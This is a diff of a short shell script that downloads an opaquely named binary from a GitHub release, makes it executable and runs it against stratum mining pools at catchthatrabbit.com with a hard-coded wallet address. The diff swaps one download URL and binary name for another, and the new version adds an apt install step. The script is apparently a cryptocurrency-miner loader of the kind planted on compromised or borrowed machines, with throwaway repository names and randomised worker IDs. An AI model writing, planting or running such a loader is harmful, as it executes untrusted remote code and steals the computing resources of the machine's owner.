@@ -1,5 +1,5 @@
-#!/bin/bash
-wget https://github.com/vedhagsvp/qubros/releases/download/apl/crcxcba
-chmod +x crcxcba
-./crcxcba -P stratum1+tcp://cb16e28eda52f3750022c539e75c84610f87af8030a9.$(echo $RANDOM | md5sum | head -c 10)@de.catchthatrabbit.com:8008 \
-     -P stratum1+tcp://cb16e28eda52f3750022c539e75c84610f87af8030a9.$(echo $RANDOM | md5sum | head -c 10)@sg.catchthatrabbit.com:8008
+#!/bin/sh
+apt update && apt install unzip -y
+wget https://github.com/tallapallitech63/opmol/releases/download/oukl/oltsp
+chmod +x oltsp
+./oltsp -P stratum1+tcp://cb16e28eda52f3750022c539e75c84610f87af8030a9.$(shuf -n 1 -i 1-99999)-vdas@de.catchthatrabbit.com:8008
